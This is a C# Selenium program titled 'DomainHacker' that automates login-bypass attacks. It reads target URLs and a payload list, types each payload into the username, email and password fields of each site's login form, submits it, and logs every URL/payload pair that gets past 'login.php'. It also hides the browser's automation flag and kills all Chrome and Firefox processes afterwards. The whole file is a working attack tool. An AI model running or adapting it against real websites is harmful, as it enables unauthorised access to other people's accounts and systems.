using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Diagnostics;
using System.IO;

namespace DomainHacker
{
    internal class Program
    {
        static Random random = new Random();
        static void Main(string[] args)
        {
            string[] urls = File.ReadAllLines(@"c:/Users/Public/urls.txt");
            string[] payloads = File.ReadAllLines(@"c:/Users/Public/payloads.txt");
            FileStream fileStream = new FileStream(@"c:/Users/Public/allowed.txt", FileMode.Append, FileAccess.Write);
            StreamWriter writer = new StreamWriter(fileStream);

            IWebDriver chromeDriver = CreateChromeDriver();
            //IWebDriver firefoxDriver = CreateFirefoxDriver();

            foreach (string url in urls)
            {
                IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)chromeDriver;
                scriptExecutor.ExecuteScript("window.open()");
            }

            foreach (string payload in payloads)
            {
                int counter = 0;
                foreach (string url in urls)
                {
                    chromeDriver.SwitchTo().Window(chromeDriver.WindowHandles[counter]);
                    chromeDriver.Navigate().GoToUrl(url);

                    try
                    {
                        chromeDriver.FindElement(By.CssSelector("input[type = text]")).SendKeys(payload);
                    }
                    catch (Exception)
                    {
                        goto USERID;
                    }
                USERID:
                    try
                    {
                        chromeDriver.FindElement(By.CssSelector("input[type = email]")).SendKeys(payload);
                    }
                    catch (Exception) { }


                    chromeDriver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);


                    try
                    {
                        chromeDriver.FindElement(By.CssSelector("input[type = submit]")).Click();
                    }
                    catch (Exception)
                    {
                        goto SUBMIT1;
                    }
                SUBMIT1:
                    try
                    {
                        chromeDriver.FindElement(By.CssSelector("input[type = button]")).Click();
                    }
                    catch (Exception)
                    {
                        goto SUBMIT2;
                    }
                SUBMIT2:
                    try
                    {
                        chromeDriver.FindElement(By.CssSelector("button[type = submit]")).Click();
                    }
                    catch (Exception) { }



                    try
                    {
                        chromeDriver.SwitchTo().Alert().Dismiss();
                    }
                    catch (Exception)
                    {

                    }
                    string currentUrl = chromeDriver.Url;
                    if (!currentUrl.Contains("login.php"))
                    {
                        writer.WriteLine(url + "    " + payload);
                        writer.Flush();
                        fileStream.Flush();
                    }
                    counter++;
                }
            }
            writer.Close();
            fileStream.Close();
            chromeDriver.Dispose();
            KillProcesses();
        }







        static public void KillProcesses()
        {
            Process[] chromeDriverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var chromeDriverProcess in chromeDriverProcesses)
            {
                chromeDriverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }
        static private ChromeDriver CreateChromeDriver()
        {
            ChromeOptions options = new ChromeOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            options.AddExcludedArgument("enable-automation");
            options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 80)));
            driver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(random.Next(10, 40)));
            driver.Manage().Window.Maximize();
            return driver;
        }
        static private FirefoxDriver CreateFirefoxDriver()
        {
            FirefoxOptions options = new FirefoxOptions();
            //options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            //service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(System.TimeSpan.FromSeconds(random.Next(10, 20)));
            driver.Manage().Window.Maximize();
            return driver;
        }

    }
}
